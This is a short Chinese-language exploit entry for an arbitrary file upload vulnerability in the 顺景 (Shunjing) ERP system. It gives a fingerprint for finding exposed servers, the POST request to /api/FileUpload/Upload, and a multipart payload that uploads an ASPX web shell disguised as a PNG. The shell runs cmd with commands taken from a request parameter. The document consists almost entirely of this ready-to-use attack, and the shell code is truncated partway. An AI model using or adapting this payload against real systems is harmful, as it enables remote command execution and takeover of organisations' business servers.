# 顺景ERP管理系统Upload存在任意文件上传漏洞

- **系统**：顺景ERP管理系统　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`body="/api/DBRecord/getDBRecords"`
- **请求**：`POST /api/FileUpload/Upload HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7yyQ5XLH…`

**请求体 / payload**
```
------WebKitFormBoundary7yyQ5XLHOn6WZ6MT
Content-Disposition: form-data; name="file"; filename="1.aspx"
Content-Type: image/png
<%@ Page Language="Jscript" validateRequest="false" %><%var c=new System.Diagnostics.ProcessStartInfo("cmd");var e=new System.Diagnostics.Process();var out:System.IO.StreamReader,EI:System.IO.StreamReader;c.UseShellExecute=false;c.RedirectStandardOutput=true;c.RedirectStandardError=true;e.StartInfo=c;c.Arguments="/c " + Request.Item["cmd"];e.Start();out=e.StandardOutput;EI=e.StandardError;e.Close();Response.Write(out.ReadToEnd() + EI.ReadToEnd());System.IO.File.Delete…（脚本共 718 字，完整版见原文）
```
- **预期**：200　|　—